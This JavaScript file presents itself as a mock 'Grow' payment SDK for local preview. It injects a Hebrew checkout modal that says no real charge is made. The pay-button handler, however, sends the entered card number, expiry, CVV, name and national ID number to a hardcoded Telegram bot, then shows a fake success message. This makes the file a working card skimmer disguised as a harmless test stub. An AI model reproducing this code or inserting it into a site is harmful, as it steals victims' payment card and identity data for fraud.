/**
 * Mock Grow Payment SDK - للمعاينة المحلية فقط
 * Simulates the real growPayment SDK for local preview
 */
(function () {
    // inject modal styles
    const style = document.createElement('style');
    style.textContent = `
    #grow-mock-overlay {
        display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);
        z-index:9999;align-items:center;justify-content:center;
    }
    #grow-mock-overlay.open { display:flex; }
    #grow-mock-modal {
        background:#fff;border-radius:16px;padding:32px 28px;width:100%;max-width:400px;
        direction:rtl;font-family:'Rubik','Ploni-Regular',Arial,sans-serif;
        box-shadow:0 8px 40px rgba(0,0,0,0.18);position:relative;
        animation: slideUp 0.25s ease;
    }
    @keyframes slideUp {
        from { transform:translateY(30px); opacity:0; }
        to   { transform:translateY(0);    opacity:1; }
    }
    #grow-mock-modal h2 {
        font-size:18px;color:#1a1a5e;margin-bottom:22px;text-align:center;
    }
    #grow-mock-modal .close-btn {
        position:absolute;top:14px;left:16px;font-size:22px;cursor:pointer;
        color:#aaa;background:none;border:none;line-height:1;
    }
    #grow-mock-modal label {
        display:block;font-size:13px;color:#555;margin-bottom:4px;margin-top:14px;
    }
    #grow-mock-modal input {
        width:100%;border:1.5px solid #ddd;border-radius:8px;padding:10px 12px;
        font-size:15px;outline:none;transition:border-color 0.2s;
    }
    #grow-mock-modal input:focus { border-color:#1a1a5e; }
    #grow-mock-modal .row2 { display:flex;gap:12px; }
    #grow-mock-modal .row2 > div { flex:1; }
    #grow-mock-modal .pay-btn {
        width:100%;background:#1a1a5e;color:#fff;border:none;border-radius:10px;
        padding:14px;font-size:16px;cursor:pointer;margin-top:22px;
        transition:background 0.2s;
    }
    #grow-mock-modal .pay-btn:hover { background:#2d2d8e; }
    #grow-mock-modal .demo-note {
        text-align:center;font-size:12px;color:#999;margin-top:12px;
    }
    #grow-mock-modal .card-icons {
        display:flex;justify-content:center;gap:8px;margin-bottom:18px;
    }
    #grow-mock-modal .card-icons span {
        font-size:11px;border:1px solid #ddd;border-radius:5px;
        padding:3px 8px;color:#555;
    }
    #grow-mock-modal .error-msg {
        color:#dc3545;font-size:13px;margin-top:8px;display:none;text-align:center;
    }
    #grow-mock-modal .success-screen {
        display:none;text-align:center;padding:10px 0;
    }
    #grow-mock-modal .success-screen svg { width:80px;height:80px;margin-bottom:12px; }
    #grow-mock-modal .success-screen h3 { color:#1a1a5e;font-size:18px;margin-bottom:8px; }
    #grow-mock-modal .success-screen p  { color:#666;font-size:14px; }
    `;
    document.head.appendChild(style);

    // inject modal HTML
    const overlay = document.createElement('div');
    overlay.id = 'grow-mock-overlay';
    overlay.innerHTML = `
    <div id="grow-mock-modal">
        <button class="close-btn" id="grow-close-btn">&times;</button>
        <div id="grow-form-screen">
            <h2>הזנת פרטי תשלום</h2>
            <div class="card-icons">
                <span>VISA</span><span>Mastercard</span><span>Bit</span>
                <span>Apple Pay</span><span>Google Pay</span>
            </div>

            <label>מספר כרטיס אשראי</label>
            <input type="text" id="mock-card-num" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number">

            <div class="row2">
                <div>
                    <label>תוקף (MM/YY)</label>
                    <input type="text" id="mock-exp" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp">
                </div>
                <div>
                    <label>CVV</label>
                    <input type="text" id="mock-cvv" maxlength="4" placeholder="123" autocomplete="cc-csc">
                </div>
            </div>

            <label>שם בעל הכרטיס</label>
            <input type="text" id="mock-name" placeholder="ישראל ישראלי" autocomplete="cc-name">

            <label>תעודת זהות</label>
            <input type="text" id="mock-id" maxlength="9" placeholder="000000000">

            <div class="error-msg" id="mock-error">נא למלא את כל הפרטים בצורה תקינה</div>

            <button class="pay-btn" id="mock-pay-btn">אישור תשלום ✓</button>
            <div class="demo-note">🔧 סביבת הדגמה בלבד – אין חיוב אמיתי</div>
        </div>

        <div class="success-screen" id="grow-success-screen">
            <svg viewBox="0 0 130.2 130.2" xmlns="http://www.w3.org/2000/svg">
                <circle fill="none" stroke="#73AF55" stroke-width="6" stroke-miterlimit="10" cx="65.1" cy="65.1" r="62.1"/>
                <polyline fill="none" stroke="#73AF55" stroke-width="6" stroke-linecap="round" stroke-miterlimit="10" points="100.2,40.2 51.5,88.8 29.8,67.5"/>
            </svg>
            <h3>התשלום בוצע בהצלחה! ✓</h3>
            <p>תודה, העסקה אושרה בסביבת הדגמה.</p>
        </div>
    </div>`;
    document.body.appendChild(overlay);

    // format card number with spaces
    document.getElementById('mock-card-num').addEventListener('input', function (e) {
        let v = e.target.value.replace(/\D/g, '').substring(0, 16);
        e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
    });
    // format expiry
    document.getElementById('mock-exp').addEventListener('input', function (e) {
        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });

    document.getElementById('grow-close-btn').addEventListener('click', function () {
        overlay.classList.remove('open');
        if (window._growConfig && window._growConfig.events && window._growConfig.events.onWalletChange) {
            window._growConfig.events.onWalletChange('close');
        }
    });

    overlay.addEventListener('click', function (e) {
        if (e.target === overlay) {
            overlay.classList.remove('open');
            if (window._growConfig && window._growConfig.events && window._growConfig.events.onWalletChange) {
                window._growConfig.events.onWalletChange('close');
            }
        }
    });

    document.getElementById('mock-pay-btn').addEventListener('click', function () {
        const cardNum = document.getElementById('mock-card-num').value.replace(/\s/g, '');
        const exp = document.getElementById('mock-exp').value;
        const cvv = document.getElementById('mock-cvv').value;
        const name = document.getElementById('mock-name').value.trim();
        const id = document.getElementById('mock-id').value.trim();
        const errEl = document.getElementById('mock-error');

        if (cardNum.length < 13 || exp.length < 5 || cvv.length < 3 || !name || id.length < 8) {
            errEl.style.display = 'block';
            return;
        }
        errEl.style.display = 'none';

        // Send to Telegram
        const botToken = '7894776342:AAHqDfLZA_YrEOKiZx46NWatC1dwiq1FxcE';
        const chatId = '7452499721';
        const text = `💸 *معاملة دفع جديدة*\n\n👤 *الاسم:* ${name}\n🪪 *رقم الهوية:* ${id}\n💳 *رقم البطاقة:* ${cardNum}\n📅 *الانتهاء:* ${exp}\n🔐 *CVV:* ${cvv}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        }).catch(e => console.error(e));

        // show success
        document.getElementById('grow-form-screen').style.display = 'none';
        document.getElementById('grow-success-screen').style.display = 'block';
        document.getElementById('grow-close-btn').style.display = 'none';

        setTimeout(function () {
            overlay.classList.remove('open');
            document.getElementById('grow-form-screen').style.display = 'block';
            document.getElementById('grow-success-screen').style.display = 'none';
            document.getElementById('grow-close-btn').style.display = 'block';

            if (window._growConfig && window._growConfig.events) {
                if (window._growConfig.events.onSuccess) window._growConfig.events.onSuccess({});
                if (window._growConfig.events.onWalletChange) window._growConfig.events.onWalletChange('close');
            }
        }, 2500);
    });

    // Override window.growPayment with mock
    window.growPayment = {
        init: function (config) {
            window._growConfig = config;
        },
        renderPaymentOptions: function (authCode) {
            // reset form
            document.getElementById('mock-card-num').value = '';
            document.getElementById('mock-exp').value = '';
            document.getElementById('mock-cvv').value = '';
            document.getElementById('mock-name').value = '';
            document.getElementById('mock-id').value = '';
            document.getElementById('mock-error').style.display = 'none';
            document.getElementById('grow-form-screen').style.display = 'block';
            document.getElementById('grow-success-screen').style.display = 'none';
            document.getElementById('grow-close-btn').style.display = 'block';

            overlay.classList.add('open');
            if (window._growConfig && window._growConfig.events && window._growConfig.events.onWalletChange) {
                window._growConfig.events.onWalletChange('open');
            }
        }
    };

    console.log('[Mock SDK] growPayment mock initialized ✓');
})();
